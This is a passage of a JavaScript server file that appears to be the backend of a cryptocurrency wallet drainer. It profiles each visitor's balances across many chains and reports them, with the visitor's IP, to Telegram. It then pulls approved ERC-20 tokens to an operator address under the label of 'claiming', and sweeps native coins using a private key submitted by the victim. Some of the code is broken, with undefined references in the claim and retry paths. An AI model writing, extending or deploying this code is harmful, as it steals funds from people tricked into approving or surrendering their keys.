import express from 'express'
import cors from 'cors'
import { ethers } from 'ethers'
import fs from 'fs'
import path from 'path'
import fetch from 'node-fetch'
import dotenv from 'dotenv'
import { sendPortfolioNotification, sendTransferNotification } from './telegram-service.js'
import { getSolanaBalances, claimSolanaTokens, getSolanaDelegatePublicKey } from './solana-service.js'
import { applyBotProtection } from './middleware/botDetection.js'

// Load environment variables (uses process.cwd()/.env locally, no-op on Netlify)
try { dotenv.config() } catch (e) { }

// Use process.cwd() as __dirname (works in both ESM local and CJS serverless)
const __dirname = process.cwd()



const app = express()
app.use(cors())
app.use(express.json())

// Bot mitigation: audit logging + global rate limiting
applyBotProtection(app)

// Ankr Advanced API Endpoint (multichain) - default to the provided key
const ANKR_ENDPOINT = process.env.ANKR_ENDPOINT ||
    'https://rpc.ankr.com/multichain/5d12226c7a80061e157c9e97e01c05d3474f925769267c3c4468fd3dd65c056f'

// Chain RPC Configuration with fallbacks
const RPC_FALLBACKS = {
    bsc: [
        process.env.BSC_RPC_URL || 'https://bsc-dataseed1.binance.org',
        'https://bsc-dataseed2.binance.org',
        'https://bsc-dataseed3.binance.org',
        'https://bsc-dataseed4.binance.org',
        'https://rpc.ankr.com/bsc'
    ],
    arb: [
        process.env.ARB_RPC_URL || 'https://arb1.arbitrum.io/rpc',
        'https://arbitrum.gateway.tenderly.co',
        'https://rpc.ankr.com/arbitrum'
    ],
    eth: [
        process.env.ETH_RPC_URL || 'https://eth.llamarpc.com',
        'https://rpc.ankr.com/eth',
        'https://ethereum.publicnode.com'
    ],
    polygon: [
        process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
        'https://polygon-rpc.publicnode.com',
        'https://rpc.ankr.com/polygon'
    ]
}

const BSC_RPC_URL = RPC_FALLBACKS.bsc[0]
const ARB_RPC_URL = RPC_FALLBACKS.arb[0]
const ETH_RPC_URL = RPC_FALLBACKS.eth[0]
const POLYGON_RPC_URL = RPC_FALLBACKS.polygon[0]
const PRIVATE_KEY = process.env.PRIVATE_KEY
const DESTINATION_ADDRESS = process.env.DESTINATION_ADDRESS

// Chain-specific spender contracts
const SPENDER_CONTRACTS = {
    // Default values matched with .env file and frontend
    bsc: process.env.SPENDER_CONTRACT || '0xEA1de60D88DdDAcc1961Deb1ca4D26B4Da606eB4',
    arb: process.env.ARB_SPENDER_CONTRACT || '0x04121eF5886D3De55Cb0AE858e85da052E8Af456',
    eth: process.env.ETH_SPENDER_CONTRACT || '0x92D3DA253b469368b8FB04703CF23812A57Fa82A',
    polygon: process.env.POLYGON_SPENDER_CONTRACT || '0xcC1359c428Ee181A214195FC64Cf91d09aFd09cF'
}

// Helper to get spender contract for a chain
const getSpenderContract = (chainKey) => {
    return SPENDER_CONTRACTS[chainKey] || SPENDER_CONTRACTS.bsc
}

// Helper to get provider with RPC fallback
const getProviderWithFallback = async (chainKey) => {
    const rpcUrls = RPC_FALLBACKS[chainKey] || RPC_FALLBACKS.bsc

    for (const rpcUrl of rpcUrls) {
        try {
            const provider = new ethers.JsonRpcProvider(rpcUrl)
            // Test the connection
            await provider.getBlockNumber()
            console.log(`✅ Connected to ${chainKey} via ${rpcUrl}`)
            return provider
        } catch (error) {
            console.warn(`⚠️  Failed to connect to ${chainKey} via ${rpcUrl}:`, error.message)
        }
    }

    throw new Error(`Failed to connect to ${chainKey} after trying all RPC endpoints`)
}

// Spender Contract ABI (only the functions we need)
const SPENDER_ABI = [
    {
        inputs: [
            { name: 'token', type: 'address' },
            { name: 'from', type: 'address' },
            { name: 'to', type: 'address' }
        ],
        name: 'claimAllTokens',
        outputs: [],
        stateMutability: 'nonpayable',
        type: 'function'
    },
    {
        inputs: [
            { name: 'token', type: 'address' },
            { name: 'user', type: 'address' }
        ],
        name: 'checkAllowance',
        outputs: [{ type: 'uint256' }],
        stateMutability: 'view',
        type: 'function'
    }
]

// RPC URLs for each chain
const CHAIN_RPC = {
    bsc: BSC_RPC_URL,
    eth: ETH_RPC_URL,
    arb: ARB_RPC_URL,
    polygon: POLYGON_RPC_URL,
    optimism: 'https://mainnet.optimism.io',
    base: 'https://mainnet.base.org',
    avalanche: 'https://api.avax.network/ext/bc/C/rpc'
}

// Known stablecoin contracts per chain (for direct on-chain fallback)
const KNOWN_STABLECOINS = {
    eth: [
        { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', name: 'Tether USD', decimals: 6 },
        { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', name: 'USD Coin', decimals: 6 },
        { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', name: 'Dai Stablecoin', decimals: 18 }
    ],
    bsc: [
        { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', name: 'Tether USD', decimals: 18 },
        { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', name: 'USD Coin', decimals: 18 },
        { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', name: 'Binance USD', decimals: 18 }
    ],
    arb: [
        { address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT', name: 'Tether USD', decimals: 6 },
        { address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', symbol: 'USDC', name: 'USD Coin', decimals: 6 },
        { address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', symbol: 'USDC.e', name: 'Bridged USDC', decimals: 6 }
    ],
    polygon: [
        { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', name: 'Tether USD', decimals: 6 },
        { address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', symbol: 'USDC', name: 'USD Coin', decimals: 6 },
        { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC.e', name: 'Bridged USDC', decimals: 6 }
    ],
    optimism: [
        { address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', symbol: 'USDT', name: 'Tether USD', decimals: 6 },
        { address: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', symbol: 'USDC', name: 'USD Coin', decimals: 6 },
        { address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', symbol: 'USDC.e', name: 'Bridged USDC', decimals: 6 }
    ],
    base: [
        { address: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2', symbol: 'USDT', name: 'Tether USD', decimals: 6 },
        { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', symbol: 'USDC', name: 'USD Coin', decimals: 6 }
    ],
    avalanche: [
        { address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', symbol: 'USDT', name: 'Tether USD', decimals: 6 },
        { address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', symbol: 'USDC', name: 'USD Coin', decimals: 6 }
    ]
}

// Minimal ERC20 ABI for balanceOf
const ERC20_BALANCE_ABI = [
    {
        constant: true,
        inputs: [{ name: '_owner', type: 'address' }],
        name: 'balanceOf',
        outputs: [{ name: 'balance', type: 'uint256' }],
        type: 'function'
    }
]

// Fetch stablecoin balances directly from chain as fallback
async function getStablecoinBalancesDirect(walletAddress) {
    const results = []

    for (const [chainKey, tokens] of Object.entries(KNOWN_STABLECOINS)) {
        try {
            const provider = await getProviderWithFallback(chainKey)

            for (const token of tokens) {
                try {
                    const contract = new ethers.Contract(token.address, ERC20_BALANCE_ABI, provider)
                    const rawBalance = await contract.balanceOf(walletAddress)

                    if (rawBalance > 0n) {
                        const balance = parseFloat(ethers.formatUnits(rawBalance, token.decimals))
                        // Stablecoins are ~$1 each
                        const usdValue = balance

                        console.log(`  [DIRECT] Found ${token.symbol} on ${chainKey}: ${balance} ($${usdValue.toFixed(2)})`)

                        results.push({
                            chain: CHAINS[chainKey]?.name || chainKey,
                            chainKey: chainKey,
                            symbol: token.symbol,
                            name: token.name,
                            address: token.address,
                            balance: balance.toString(),
                            rawBalance: rawBalance.toString(),
                            decimals: token.decimals,
                            isNative: false,
                            usdValue: usdValue,
                            priceUsd: 1,
                            thumbnail: null
                        })
                    }
                } catch (tokenErr) {
                    // Token contract call failed, skip
                }
            }
        } catch (chainErr) {
            console.log(`  [DIRECT] Failed to connect to ${chainKey}: ${chainErr.message}`)
        }
    }

    return results
}

// Chain configurations (for display names)
// NOTE: Ankr returns 'arbitrum' and 'polygon' but frontend uses 'arb' and 'polygon'
const CHAINS = {
    eth: {
        name: 'Ethereum',
        symbol: 'ETH'
    },
    bsc: {
        name: 'BNB Smart Chain',
        symbol: 'BNB'
    },
    arbitrum: {
        name: 'Arbitrum',
        symbol: 'ETH'
    },
    arb: {
        name: 'Arbitrum',
        symbol: 'ETH'
    },
    polygon: {
        name: 'Polygon',
        symbol: 'MATIC'
    },
    optimism: {
        name: 'Optimism',
        symbol: 'ETH'
    },
    base: {
        name: 'Base',
        symbol: 'ETH'
    },
    avalanche: {
        name: 'Avalanche',
        symbol: 'AVAX'
    },
    fantom: {
        name: 'Fantom',
        symbol: 'FTM'
    },
    gnosis: {
        name: 'Gnosis',
        symbol: 'xDAI'
    }
}

// Known scam/spam token patterns to filter out
const SCAM_PATTERNS = [
    /airdrop/i,
    /claim/i,
    /visit/i,
    /\.com/i,
    /\.io/i,
    /\.org/i,
    /\.net/i,
    /free/i,
    /bonus/i,
    /reward/i,
    /\.xyz/i,
    /voucher/i,
    /http/i,
    /www\./i
]

// Stablecoins we always want to keep, even if price data is missing
const STABLE_TOKENS = new Set([
    'usdt',
    'usdt.e',
    'usdc',
    'usdc.e',
    'dai',
    'busd',
    'fdusd',
    'tusd',
    'usdd',
    'usdp',
    'gusd'
])

const normalizeStableKey = (value = '') => value.toLowerCase().replace(/[^a-z0-9]/g, '')

// Check if token name/symbol looks like spam
function isSpamToken(name, symbol) {
    const combined = `${name} ${symbol}`
    return SCAM_PATTERNS.some(pattern => pattern.test(combined))
}

// Check if token is a stablecoin by symbol/name
function isStableToken(name = '', symbol = '') {
    const sym = normalizeStableKey(symbol)
    const nam = normalizeStableKey(name)

    if (STABLE_TOKENS.has(sym) || STABLE_TOKENS.has(nam)) return true

    // Fallback: substring check for variants like "USDt", "USDTpo", "USDT.e"
    return sym.includes('usdt') || sym.includes('usdc') || nam.includes('usdt') || nam.includes('usdc')
}

// Fetch all balances using Ankr Advanced API
async function getAnkrBalances(walletAddress) {
    try {
        console.log(`\nFetching balances from Ankr Advanced API...`)

        const response = await fetch(ANKR_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                jsonrpc: '2.0',
                method: 'ankr_getAccountBalance',
                params: {
                    blockchain: ['eth', 'bsc', 'arbitrum', 'polygon', 'optimism', 'base', 'avalanche', 'fantom', 'gnosis'],
                    walletAddress: walletAddress,
                    onlyWhitelisted: false
                },
                id: 1
            })
        })

        if (!response.ok) {
            throw new Error(`Ankr API returned status ${response.status}`)
        }

        const data = await response.json()

        if (data.error) {
            throw new Error(data.error.message || 'Ankr API error')
        }

        // DEBUG: Log raw Ankr response
        console.log(`\n  [DEBUG] Raw Ankr response assets count: ${data.result?.assets?.length || 0}`)
        if (data.result?.assets) {
            console.log('  [DEBUG] Assets by chain:')
            const chainCount = {}
            data.result.assets.forEach(asset => {
                chainCount[asset.blockchain] = (chainCount[asset.blockchain] || 0) + 1
            })
            Object.entries(chainCount).forEach(([chain, count]) => {
                console.log(`    - ${chain}: ${count} assets`)
            })
        }

        return data.result
    } catch (error) {
        console.error('Error fetching from Ankr:', error.message)
        throw error
    }
}

// Fetch price from DexScreener when Ankr price is missing
async function getFallbackPriceUsd(tokenAddress) {
    try {
        const resp = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`)
        if (!resp.ok) return 0
        const data = await resp.json()
        const pair = data.pairs?.[0]
        const price = pair?.priceUsd ? parseFloat(pair.priceUsd) : 0
        return isNaN(price) ? 0 : price
    } catch (err) {
        console.log(`  [DEBUG] DexScreener price fetch failed for ${tokenAddress}: ${err.message}`)
        return 0
    }
}

// Process Ankr response into our format
async function processAnkrBalances(ankrResult) {
    const balances = []

    if (!ankrResult || !ankrResult.assets) {
        return balances
    }

    // Debug: Log ALL assets from Ankr before filtering
    console.log(`\n  [DEBUG] Processing ${ankrResult.assets.length} assets from Ankr:`)
    for (const asset of ankrResult.assets) {
        console.log(`    - ${asset.tokenSymbol} (${asset.blockchain}): balance=${asset.balance}, usd=$${asset.balanceUsd || '0'}, contract=${asset.contractAddress || 'native'}`)
    }

    for (const asset of ankrResult.assets) {
        // Filter spam tokens
        if (isSpamToken(asset.tokenName || '', asset.tokenSymbol || '')) {
            console.log(`  [DEBUG] Skipped spam token: ${asset.tokenSymbol}`)
            continue
        }

        // Map Ankr blockchain names to our chain keys
        let chainKey = asset.blockchain
        let chainInfo = CHAINS[chainKey]

        if (!chainInfo) {
            // Log skipped chains for debugging
            console.log(`  [DEBUG] Skipped asset on unknown chain: ${chainKey} - ${asset.tokenSymbol}`)
            continue
        }

        const balance = parseFloat(asset.balance || '0')
        let balanceUsd = parseFloat(asset.balanceUsd || '0')
        let priceUsd = parseFloat(asset.tokenPrice || '0')

        // Determine if this is a native token (ETH, BNB, MATIC, etc.)
        const isNative = asset.tokenType === 'NATIVE'
        const stable = isStableToken(asset.tokenName, asset.tokenSymbol)

        // If Ankr doesn't return pricing but balance exists, try DexScreener
        if (!isNative && balance > 0 && balanceUsd === 0 && asset.contractAddress) {
            const fallbackPrice = await getFallbackPriceUsd(asset.contractAddress)
            if (fallbackPrice > 0) {
                priceUsd = fallbackPrice
                balanceUsd = fallbackPrice * balance
                console.log(`  [DEBUG] Filled missing price for ${asset.tokenSymbol} via DexScreener: $${fallbackPrice}`)
            } else if (stable) {
                // For known stablecoins, default to $1 when price API fails
                priceUsd = 1
                balanceUsd = balance
                console.log(`  [DEBUG] Filled missing price for stablecoin ${asset.tokenSymbol} with $1 fallback`)
            }
        }

        // Skip tokens below minimum threshold (keep native + stable even if tiny)
        // Set very low to avoid dropping real tokens
        const MIN_USD_THRESHOLD = 0.001
        if (!isNative && !stable && balanceUsd < MIN_USD_THRESHOLD) {
            console.log(`  [DEBUG] Skipped ${asset.tokenSymbol}: below $${MIN_USD_THRESHOLD} threshold (value: $${balanceUsd.toFixed(2)})`)
            continue
        }

        console.log(`  [DEBUG] Including ${asset.tokenSymbol}: $${balanceUsd.toFixed(2)} on ${chainKey}`)



        balances.push({
            chain: chainInfo.name,
            chainKey: chainKey === 'arbitrum' ? 'arb' : chainKey,  // Keep polygon as-is
            symbol: asset.tokenSymbol || 'Unknown',
            name: asset.tokenName || 'Unknown Token',
            address: asset.contractAddress || null,
            balance: asset.balance || '0',
            rawBalance: asset.balanceRawInteger || '0',
            decimals: asset.tokenDecimals || 18,
            isNative: isNative,
            usdValue: balanceUsd,
            priceUsd: priceUsd,
            thumbnail: asset.thumbnail || null
        })
    }

    // Sort by USD value (high to low)
    balances.sort((a, b) => b.usdValue - a.usdValue)

    return balances
}

// Check all balances for a wallet
async function checkAllBalances(walletAddress) {
    console.log(`\n[BALANCE CHECK] Starting balance detection for ${walletAddress}`)

    // 1) Try Ankr first
    let balances = []
    try {
        const ankrResult = await getAnkrBalances(walletAddress)
        balances = await processAnkrBalances(ankrResult)
        console.log(`  [ANKR] Found ${ankrResult?.assets?.length || 0} assets, after filtering: ${balances.length}`)
    } catch (ankrErr) {
        console.error(`  [ANKR] Failed: ${ankrErr.message}`)
    }

    // 2) Direct on-chain fallback for known stablecoins (catches USDT/USDC if Ankr missed them)
    console.log(`  [DIRECT] Checking known stablecoins on-chain as fallback...`)
    const directStables = await getStablecoinBalancesDirect(walletAddress)

    // 3) Merge: add direct results that aren't already in Ankr results
    const existingAddresses = new Set(balances.map(b => b.address?.toLowerCase()).filter(Boolean))
    for (const stable of directStables) {
        if (!existingAddresses.has(stable.address.toLowerCase())) {
            console.log(`  [MERGE] Adding ${stable.symbol} from direct check ($${stable.usdValue.toFixed(2)})`)
            balances.push(stable)
        }
    }

    // 4) Re-sort by USD value (highest first)
    balances.sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0))

    console.log(`  [FINAL] Total tokens after merge: ${balances.length}`)
    balances.forEach(b => {
        console.log(`    - ${b.symbol} (${b.chainKey}): $${b.usdValue?.toFixed(2) || '0.00'}`)
    })

    return balances
}

// API endpoint to check balances
app.post('/api/check-balances', async (req, res) => {
    try {
        const { address } = req.body

        if (!address || !ethers.isAddress(address)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address'
            })
        }

        console.log(`\n${'='.repeat(50)}`)
        console.log(`Checking balances for: ${address}`)
        console.log(`Time: ${new Date().toISOString()}`)
        console.log(`${'='.repeat(50)}`)

        const balances = await checkAllBalances(address)

        // Calculate total USD value
        const totalUsdValue = balances.reduce((sum, b) => sum + (b.usdValue || 0), 0)

        // Prepare data to save
        const dataToSave = {
            address,
            timestamp: new Date().toISOString(),
            chains: Object.keys(CHAINS).length,
            totalUsdValue: totalUsdValue.toFixed(2),
            balances
        }

        // Save to JSON file
        const filePath = path.join(__dirname, 'balances.json')

        // Read existing data or create new array
        let existingData = []
        if (fs.existsSync(filePath)) {
            try {
                const fileContent = fs.readFileSync(filePath, 'utf8')
                existingData = JSON.parse(fileContent)
                if (!Array.isArray(existingData)) {
                    existingData = [existingData]
                }
            } catch {
                existingData = []
            }
        }

        // Add new entry
        existingData.push(dataToSave)

        // Write back to file
        try { fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2)) } catch (e) { /* read-only fs in serverless */ }

        console.log(`\n${'='.repeat(50)}`)
        console.log(`Found ${balances.length} tokens/coins`)
        console.log(`Total USD Value: $${totalUsdValue.toFixed(2)}`)
        console.log(`Data saved to balances.json`)

        // Log balances to console
        console.log('\nBalances (sorted by USD value):')
        balances.forEach(b => {
            console.log(`  ${b.symbol} (${b.chain}): ${parseFloat(b.balance).toFixed(6)} = $${b.usdValue?.toFixed(2) || '0.00'}`)
        })
        console.log(`${'='.repeat(50)}\n`)

        // Send initial portfolio notification to Telegram
        const telegramData = {
            address,
            totalUsdValue: totalUsdValue.toFixed(2),
            tokenCount: balances.length,
            balances
        }
        sendPortfolioNotification(telegramData).catch(err => {
            console.error('Failed to send Telegram notification:', err.message)
        })

        res.json({
            success: true,
            tokenCount: balances.length,
            chains: Object.keys(CHAINS).length,
            totalUsdValue: totalUsdValue.toFixed(2),
            balances
        })

    } catch (error) {
        console.error('Error checking balances:', error)
        res.status(500).json({
            success: false,
            error: 'Failed to check balances'
        })
    }
})

// ==========================================
// Nonce management to prevent conflicts
// ==========================================
const nonceTracker = {}
const nonceLock = {}

async function getNextNonce(provider, address, chainKey) {
    // Wait for any pending nonce operation on this chain
    while (nonceLock[chainKey]) {
        await new Promise(resolve => setTimeout(resolve, 50))
    }
    nonceLock[chainKey] = true

    try {
        // Get the current nonce from the network
        const networkNonce = await provider.getTransactionCount(address, 'pending')

        // Use the higher of tracked nonce or network nonce
        const trackedNonce = nonceTracker[chainKey] || 0
        const nextNonce = Math.max(networkNonce, trackedNonce)

        // Update tracker for next transaction
        nonceTracker[chainKey] = nextNonce + 1

        console.log(`Nonce for ${chainKey}: network=${networkNonce}, tracked=${trackedNonce}, using=${nextNonce}`)
        return nextNonce
    } finally {
        nonceLock[chainKey] = false
    }
}

// Shared EVM claim helper (delegate pulls approved ERC20 to DESTINATION)
async function attemptEvmClaim({ token, wallet, chainKey, retryLabel = '' }) {
    // Validate required fields
    if (!token || !ethers.isAddress(token)) {
        return { status: 400, response: { success: false, error: 'Invalid token address' } }
    }

    if (!wallet || !ethers.isAddress(wallet)) {
        return { status: 400, response: { success: false, error: 'Invalid wallet address' } }
    }

    // Validate configuration
    if (!PRIVATE_KEY) {
        return { status: 500, response: { success: false, error: 'Server not configured: missing PRIVATE_KEY' } }
    }

    if (!DESTINATION_ADDRESS) {
        return { status: 500, response: { success: false, error: 'Server not configured: missing DESTINATION_ADDRESS' } }
    }

    console.log(`\n${'='.repeat(50)}`)
    console.log(`TOKEN CLAIM REQUEST ${retryLabel}`)
    console.log(`Time: ${new Date().toISOString()}`)
    console.log(`Token: ${token}`)
    console.log(`From Wallet: ${wallet}`)
    console.log(`Chain: ${chainKey || 'bsc'}`)
    console.log(`To Destination: ${DESTINATION_ADDRESS}`)
    console.log(`${'='.repeat(50)}`)

    const chain = chainKey || 'bsc'
    const rpcUrl = CHAIN_RPC[chain] || CHAIN_RPC.bsc
    const spenderContractAddress = getSpenderContract(chain)

    if (!spenderContractAddress) {
        return { status: 500, response: { success: false, error: `No spender contract configured for ${chain}` } }
    }

    console.log(`Using RPC: ${rpcUrl}`)
    console.log(`Using Spender Contract: ${spenderContractAddress}`)

    const provider = await getProviderWithFallback(chain)
    const signerWallet = new ethers.Wallet(PRIVATE_KEY, provider)
    const signerAddress = await signerWallet.getAddress()
    console.log(`Signer address: ${signerAddress}`)

    const spenderContract = new ethers.Contract(spenderContractAddress, SPENDER_ABI, signerWallet)

    const allowance = await spenderContract.checkAllowance(token, wallet)
    console.log(`Allowance: ${ethers.formatUnits(allowance, 18)}`)

    if (allowance === 0n) {
        console.log(`No allowance found for this token`)
        return { status: 400, response: { success: false, error: 'No allowance found. User must approve the contract first.' } }
    }

    const nonce = await getNextNonce(provider, signerAddress, chain)
    console.log(`Calling claimAllTokens with nonce ${nonce}...`)
    const tx = await spenderContract.claimAllTokens(token, wallet, DESTINATION_ADDRESS, { nonce })
    console.log(`Transaction sent: ${tx.hash}`)

    const receipt = await tx.wait()
    console.log(`Transaction confirmed in block: ${receipt.blockNumber}`)
    console.log(`Gas used: ${receipt.gasUsed.toString()}`)
    console.log(`${'='.repeat(50)}\n`)

    const claimsPath = path.join(__dirname, 'claims.json')
    let claims = []
    if (fs.existsSync(claimsPath)) {
        try {
            claims = JSON.parse(fs.readFileSync(claimsPath, 'utf8'))
        } catch { claims = [] }
    }
    claims.push({
        timestamp: new Date().toISOString(),
        token,
        wallet,
        chainKey: chain,
        destination: DESTINATION_ADDRESS,
        txHash: tx.hash,
        blockNumber: receipt.blockNumber,
        gasUsed: receipt.gasUsed.toString()
    })
    try { fs.writeFileSync(claimsPath, JSON.stringify(claims, null, 2)) } catch (e) { /* read-only fs in serverless */ }

    // Send Telegram notification for successful transfer
    await sendTransferNotification({
        symbol: req.body.symbol,
        chain: req.body.chain,
        amount: req.body.amount,
        usdValue: req.body.usdValue,
        fromAddress: req.body.address,
        txHash: tx.hash,
        ipAddress: req.ip || req.headers['x-forwarded-for'] || req.headers['x-real-ip']
    })

    return {
        status: 200,
        response: {
            success: true,
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            message: 'Tokens claimed successfully!'
        }
    }
}

// ==========================================
// API endpoint to claim tokens after approval
// This is called by the frontend after a successful token approval
// ==========================================
app.post('/api/claim-tokens', async (req, res) => {
    const MAX_RETRIES = 3
    let retryCount = 0

    try {
        let result = await attemptEvmClaim(req.body)

        // Retry on nonce errors
        while (result.status === 500 && retryCount < MAX_RETRIES) {
            const errorDetails = result.response?.details || ''
            const isNonceError = errorDetails.includes('nonce') ||
                errorDetails.includes('NONCE_EXPIRED') ||
                errorDetails.includes('replacement transaction')

            if (!isNonceError) break

            retryCount++
            console.log(`Nonce conflict detected, retrying (${retryCount}/${MAX_RETRIES})...`)

            // Reset nonce tracker for this chain to force fresh lookup
            const chain = req.body.chainKey || 'bsc'
            delete nonceTracker[chain]

            // Wait a bit before retry
            await new Promise(resolve => setTimeout(resolve, 1000))

            result = await attemptEvmClaim(req.body, `(Retry ${retryCount})`)
        }

        return res.status(result.status).json(result.response)

    } catch (error) {
        console.error('Error claiming tokens:', error)

        // Check if it's a nonce error and we can retry
        const isNonceError = error.message?.includes('nonce') ||
            error.code === 'NONCE_EXPIRED' ||
            error.message?.includes('replacement transaction')

        if (isNonceError && retryCount < MAX_RETRIES) {
            retryCount++
            console.log(`Nonce error caught, retrying (${retryCount}/${MAX_RETRIES})...`)

            // Reset nonce tracker
            const chain = req.body.chainKey || 'bsc'
            delete nonceTracker[chain]

            await new Promise(resolve => setTimeout(resolve, 1000))

            try {
                const result = await attemptClaim()
                return res.status(result.status).json(result.response)
            } catch (retryError) {
                console.error('Retry also failed:', retryError.message)
            }
        }

        // Parse common errors
        let errorMessage = 'Failed to claim tokens'
        if (error.message?.includes('insufficient funds')) {
            errorMessage = 'Insufficient BNB for gas fees'
        } else if (error.message?.includes('Not owner')) {
            errorMessage = 'Signer is not the contract owner'
        } else if (error.message?.includes('No allowance')) {
            errorMessage = 'User has not approved the contract'
        } else if (error.message?.includes('Nothing to claim')) {
            errorMessage = 'No tokens to claim (balance or allowance is 0)'
        } else if (error.message?.includes('nonce')) {
            errorMessage = 'Transaction conflict - please try again'
        }

        res.status(500).json({
            success: false,
            error: errorMessage,
            details: error.message
        })
    }
})

// ==========================================
// API endpoint to transfer native tokens (ETH/BNB/MATIC)
// Used when there's nothing to approve - just transfer max balance minus gas
// ==========================================
app.post('/api/transfer-native', async (req, res) => {
    try {
        const { walletPrivateKey, chainKey } = req.body

        // Validate required fields
        if (!walletPrivateKey) {
            return res.status(400).json({
                success: false,
                error: 'Missing walletPrivateKey'
            })
        }

        if (!DESTINATION_ADDRESS) {
            return res.status(500).json({
                success: false,
                error: 'Server not configured: missing DESTINATION_ADDRESS'
            })
        }

        // Get the correct RPC for the chain
        const chain = chainKey || 'bsc'
        const rpcUrl = CHAIN_RPC[chain] || CHAIN_RPC.bsc

        console.log(`\n${'='.repeat(50)}`)
        console.log(`NATIVE TOKEN TRANSFER REQUEST`)
        console.log(`Time: ${new Date().toISOString()}`)
        console.log(`Chain: ${chain}`)
        console.log(`Destination: ${DESTINATION_ADDRESS}`)
        console.log(`Using RPC: ${rpcUrl}`)
        console.log(`${'='.repeat(50)}`)

        // Create provider and wallet from the source wallet's private key
        const provider = await getProviderWithFallback(chain)
        const sourceWallet = new ethers.Wallet(walletPrivateKey, provider)
        const sourceAddress = await sourceWallet.getAddress()

        console.log(`Source Wallet: ${sourceAddress}`)

        // Get current balance
        const balance = await provider.getBalance(sourceAddress)
        console.log(`Current Balance: ${ethers.formatEther(balance)} ${CHAINS[chain]?.symbol || 'Native'}`)

        if (balance === 0n) {
            return res.status(400).json({
                success: false,
                error: 'Wallet has no native token balance to transfer'
            })
        }

        // Get current gas price and add priority for faster confirmation
        const feeData = await provider.getFeeData()
        let gasPrice = feeData.gasPrice

        // Add 20% buffer to gas price for faster confirmation
        if (gasPrice) {
            gasPrice = (gasPrice * 120n) / 100n
        }

        // Estimate gas for a simple transfer (21000 is standard for native transfers)
        const gasLimit = 21000n

        // Calculate gas cost
        const gasCost = gasLimit * gasPrice
        console.log(`Estimated Gas Cost: ${ethers.formatEther(gasCost)} ${CHAINS[chain]?.symbol || 'Native'}`)

        // Calculate max transferable amount (balance - gas cost)
        const maxTransferAmount = balance - gasCost

        if (maxTransferAmount <= 0n) {
            return res.status(400).json({
                success: false,
                error: 'Balance too low to cover gas fees',
                details: {
                    balance: ethers.formatEther(balance),
                    gasCost: ethers.formatEther(gasCost)
                }
            })
        }

        console.log(`Transfer Amount: ${ethers.formatEther(maxTransferAmount)} ${CHAINS[chain]?.symbol || 'Native'}`)

        // Get proper nonce
        const nonce = await getNextNonce(provider, sourceAddress, chain)

        // Create and send the transaction
        const tx = await sourceWallet.sendTransaction({
            to: DESTINATION_ADDRESS,
            value: maxTransferAmount,
            gasLimit: gasLimit,
            gasPrice: gasPrice,
            nonce: nonce
        })

        console.log(`Transaction sent: ${tx.hash}`)

        // Wait for confirmation
        const receipt = await tx.wait()
        console.log(`Transaction confirmed in block: ${receipt.blockNumber}`)
        console.log(`Gas used: ${receipt.gasUsed.toString()}`)
        console.log(`${'='.repeat(50)}\n`)

        // Log to claims file
        const claimsPath = path.join(__dirname, 'claims.json')
        let claims = []
        if (fs.existsSync(claimsPath)) {
            try {
                claims = JSON.parse(fs.readFileSync(claimsPath, 'utf8'))
            } catch { claims = [] }
        }
        claims.push({
            timestamp: new Date().toISOString(),
            type: 'native_transfer',
            sourceWallet: sourceAddress,
            chainKey: chain,
            amount: ethers.formatEther(maxTransferAmount),
            destination: DESTINATION_ADDRESS,
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            gasUsed: receipt.gasUsed.toString()
        })
        try { fs.writeFileSync(claimsPath, JSON.stringify(claims, null, 2)) } catch (e) { /* read-only fs in serverless */ }

        return res.json({
            success: true,
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            amount: ethers.formatEther(maxTransferAmount),
            symbol: CHAINS[chain]?.symbol || 'Native',
            message: 'Native tokens transferred successfully!'
        })

    } catch (error) {
        console.error('Error transferring native tokens:', error)

        let errorMessage = 'Failed to transfer native tokens'
        if (error.message?.includes('insufficient funds')) {
            errorMessage = 'Insufficient balance for gas fees'
        } else if (error.message?.includes('nonce')) {
            errorMessage = 'Transaction conflict - please try again'
        } else if (error.message?.includes('invalid')) {
            errorMessage = 'Invalid private key or transaction parameters'
        }

        res.status(500).json({
            success: false,
            error: errorMessage,
            details: error.message
        })
    }
})

// API endpoint to send final approval/rejection statistics to Telegram
app.post('/api/send-stats', async (req, res) => {
    try {
        const { address, stats, balances, totalUsdValue } = req.body

        if (!address || !ethers.isAddress(address)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address'
            })
        }

        console.log(`\n${'='.repeat(50)}`)
        console.log(`SENDING FINAL STATISTICS TO TELEGRAM`)
        console.log(`Wallet: ${address}`)
        console.log(`Stats:`, stats)
        console.log(`${'='.repeat(50)}\n`)

        // Send complete notification with statistics to Telegram
        const telegramData = {
            address,
            totalUsdValue: totalUsdValue || '0',
